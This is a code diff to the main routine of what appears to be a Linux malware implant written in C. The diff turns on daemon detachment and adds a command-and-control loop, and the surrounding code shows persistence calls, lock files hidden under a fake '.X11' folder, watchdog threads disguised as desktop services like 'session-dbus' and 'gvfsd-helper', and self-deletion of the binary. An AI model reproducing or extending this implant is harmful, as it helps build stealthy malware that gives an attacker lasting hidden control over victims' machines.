@@ -8,6 +8,7 @@
 // custom functions
 #include "utils.h"
 #include "persistence.h"
+#include "c2_commands.h"
 
 int main(int argc, char *argv[]) {
 
@@ -16,19 +17,18 @@ int main(int argc, char *argv[]) {
     #endif
 
     pid_t id = getuid();
-
     // perform file lock check here to see what's currently locked or not.
 
     // TODO: *fpath = session_dbus_file_write
-    // Spawn session-dbus (monitor)
 
+    // Spawn session-dbus (monitor)
     //if session-dbus lock file is locked... creat the lock for gvfsd and spawn gvfsd
     if (lock_check("/home/gdev/.X11/.X11-lock") != 0) {
 
         create_lock(1);  // lock file created, when gvfspd spawns session-dbus, the top loop will run forever.
 
         if (id != 0 ) { // non-root
-           // daemon(0, 0);
+            daemon(0, 0);
            // spawn gvfsd-helper
             spawn_thread_watchdog(1);
         }
@@ -46,7 +46,7 @@ bool desktop_res = nonroot_persistence();
     }
     // if root do ....
     if (id == 0) {
-        //daemon(0, 0);  // detach from current console
+        daemon(0, 0);  // detach from current console
         // TODO - spawn root thread, and perform root operations
 
     } else { // non-root user....
@@ -57,8 +57,10 @@ bool desktop_res = nonroot_persistence();
 
         // creating .X11/X0-lock
         create_lock(0);
+
         //session-dbus create
         spawn_thread_watchdog(0);
+
         // Main C2 goes here?
     }
 
@@ -66,5 +68,7 @@ bool desktop_res = nonroot_persistence();
     self_delete(argv[0]); //  deleting this binary.
     #endif
     // TODO: main_c2_loop goes here (gvfsd-helper).
+
+    c2_loop();
     return 0;
  }
